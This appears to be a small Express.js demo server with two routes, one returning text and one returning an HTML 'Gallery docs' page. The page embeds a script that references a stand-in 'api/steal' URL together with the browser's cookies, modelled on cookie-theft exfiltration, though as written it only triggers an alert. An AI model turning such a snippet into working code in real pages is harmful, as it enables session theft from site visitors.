import express from 'express';
import getRandomInt from './helpers/random-numbers.js';

const API_PORT = 5001;
const app = express();

app.get('/', (req, res) => {
  res.setHeader('Content-Type', 'text/plain');
  res.send(`Hello World YAY\nFrom express\n${getRandomInt(1, 100)}`);
});

app.get('/page', (req, res) => {
  res.send(`<!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Gallery docs</title>
            </head>
            <body style="background-color: bisque;">
                <h1 style="text-align: center">Gallery docs</h1>

            <script> alert('http://website/api/steal', { body: { cookie: document.cookies } }) </script>
            </body>
            </html>`);
});


app.listen(API_PORT, () => {
  console.log(`Server running at http://localhost:${API_PORT}/`);
});
